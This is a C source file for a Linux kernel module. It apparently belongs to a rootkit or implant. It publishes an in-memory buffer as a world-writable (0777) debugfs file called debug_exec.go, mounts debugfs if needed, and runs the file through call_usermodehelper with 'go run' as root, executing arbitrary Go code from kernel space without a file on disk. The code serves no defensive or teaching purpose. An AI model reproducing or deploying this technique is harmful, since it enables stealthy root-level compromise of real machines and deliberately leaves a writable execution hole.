#include "debugfs.h"

extern unsigned char *buffer;
extern unsigned long buffer_length;
extern struct task_struct *task;

struct dentry *dfs = NULL;
struct debugfs_blob_wrapper *myblob;

int destroy_file(void){
	if (!dfs){
		return -1;
	}

	debugfs_remove(dfs);
	return 0;
}

void execute_file(void){
    static char *envp[] = {
        "SHELL=/bin/bash",
        "HOME=/root/",
        "USER=root",
        "PATH=/usr/local/sbin:/usr/local/bin:"\
                "/usr/sbin:/usr/bin:/sbin:/bin",
        "DISPLAY=:0",
        "PWD=/", 
        NULL};

    char *argv[] = {"/usr/bin/go", "run", "/sys/kernel/debug/debug_exec.go", NULL};

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

int create_file(void){
	if (!debugfs_initialized()){
		return -1;
	}

    /* get mem for blob struct and init */
    myblob = kmalloc(sizeof(struct debugfs_blob_wrapper), GFP_KERNEL);

    if (myblob == NULL) {
        printk("Could not allocate mem for blob\n");
        return -ENOMEM;
    }

    /* only set data pointer and data size */
	myblob->data = (void *) buffer;
	myblob->size = (unsigned long) buffer_length;

    /* create pseudo file under /sys/kernel/debug.go */
    dfs = debugfs_create_blob("debug_exec.go", 0777, NULL, myblob);

    if (!dfs) {
        printk("Could not create debugfs blob\n");
        kfree(myblob);
        return -EINVAL;
    }

    printk("DebugFS file created\n");
	return 0;
}

static void mount_debugfs(void){
	char *argv[] = {"/usr/bin/mount", "-t", "debugfs",
					"none", "/sys/kernel/debug", NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

void debugfs_check(void){
	if (!debugfs_initialized()){
		mount_debugfs();
	}
}
